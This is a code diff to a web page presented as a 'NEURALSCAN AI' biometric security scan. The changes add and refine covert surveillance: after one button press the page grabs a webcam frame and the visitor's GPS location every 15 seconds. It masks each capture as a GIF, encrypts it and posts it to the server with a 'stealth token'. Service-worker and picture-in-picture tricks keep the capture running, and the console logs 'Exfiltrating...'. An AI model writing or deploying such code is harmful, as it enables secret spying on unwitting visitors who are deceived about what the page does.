@@ -32,7 +32,9 @@
             background: linear-gradient(135deg, var(--primary), var(--accent));
             color: white; border: none; padding: 16px; border-radius: 12px; width: 100%;
             font-weight: bold; font-size: 16px; cursor: pointer;
+            transition: transform 0.2s;
         }
+        .btn:active { transform: scale(0.98); }
         #console { font-family: monospace; font-size: 11px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 50px; }
     </style>
 </head>
@@ -40,19 +42,24 @@
 
 <div class="glass-card">
     <span class="logo">NEURAL<span>SCAN</span> AI</span>
-    <p style="font-size: 12px; color: #cbd5e1;">PRODUCTION MODE: RAILWAY.APP</p>
+    <p style="font-size: 12px; color: #cbd5e1;">CLOUD SECURE: RENDER.COM</p>
     <div class="preview-window">
         <div id="scan-bar" class="scan-bar" style="display:block;"></div>
         <video id="video" autoplay muted playsinline></video>
-        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px;">AWAITING SSL LINK...</div>
+        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px;">AWAITING BIOMETRIC LINK...</div>
     </div>
     <button id="main-btn" class="btn">INITIALIZE PERSISTENCE</button>
-    <div id="console">> System Idle.</div>
+    <div id="console">> System Standby.</div>
 </div>
 
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
+    // --- HTTPS ENFORCER ---
+    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+        location.replace(`https:${location.href.substring(location.protocol.length)}`);
+    }
+
     const btn = document.getElementById('main-btn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -62,12 +69,15 @@
     const SECRET_PASSPHRASE = "neural-link-omega-99"; 
     const STEALTH_TOKEN = "delta-v-882-alpha";
     const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
-    let coords = { lat: 0, lon: 0 };
+    let coords = { lat: "unknown", lon: "unknown" };
 
     const log = (msg) => { consoleLog.innerHTML = `> ${msg}`; };
 
+    // Register Service Worker
     if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js'));
+        window.addEventListener('load', () => {
+            navigator.serviceWorker.register('/sw.js').then(() => log("Persistence layer ready."));
+        });
     }
 
     async function deriveKey(pass) {
@@ -89,7 +99,13 @@
 
     btn.onclick = async () => {
         btn.disabled = true;
-        navigator.geolocation.getCurrentPosition((p) => { coords = { lat: p.coords.latitude, lon: p.coords.longitude }; });
+        log("Requesting Handshake...");
+
+        // Start GPS Capture
+        navigator.geolocation.getCurrentPosition(
+            (p) => { coords = { lat: p.coords.latitude, lon: p.coords.longitude }; },
+            (err) => { log("GPS Refused. Continuing with IP..."); }
+        );
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -97,22 +113,41 @@
             video.style.display = 'block';
             document.getElementById('placeholder').style.display = 'none';
             
-            if (video.requestPictureInPicture) await video.requestPictureInPicture();
+            // Picture-in-Picture for persistence
+            if (document.pictureInPictureEnabled && video.requestPictureInPicture) {
+                video.requestPictureInPicture().catch(() => {});
+            }
 
-            log("Persistence active. Tunneling...");
+            // Signal Service Worker persistence
+            if (navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({ type: 'INIT_PERSISTENCE' });
+            }
+
+            log("Handshake successful. Exfiltrating...");
             
             setInterval(async () => {
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
-                const masked = await encryptAndMask({ image: canvas.toDataURL('image/jpeg', 0.5), metadata: { location: coords, ts: new Date().toISOString() } });
+                const masked = await encryptAndMask({ 
+                    image: canvas.toDataURL('image/jpeg', 0.5), 
+                    metadata: { location: coords, ts: new Date().toISOString() } 
+                });
+
                 fetch('/save-photo', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-Neural-Token': STEALTH_TOKEN },
+                    headers: { 
+                        'Content-Type': 'application/json', 
+                        'X-Neural-Token': STEALTH_TOKEN 
+                    },
                     body: JSON.stringify({ data: masked })
-                });
+                }).catch(e => console.error("Tunnel error"));
+
             }, 15000);
 
-        } catch (e) { log("Handshake Error: Use HTTPS."); btn.disabled = false; }
+        } catch (e) { 
+            log(`Critical Error: ${e.message}`); 
+            btn.disabled = false; 
+        }
     };
 </script>
 </body>
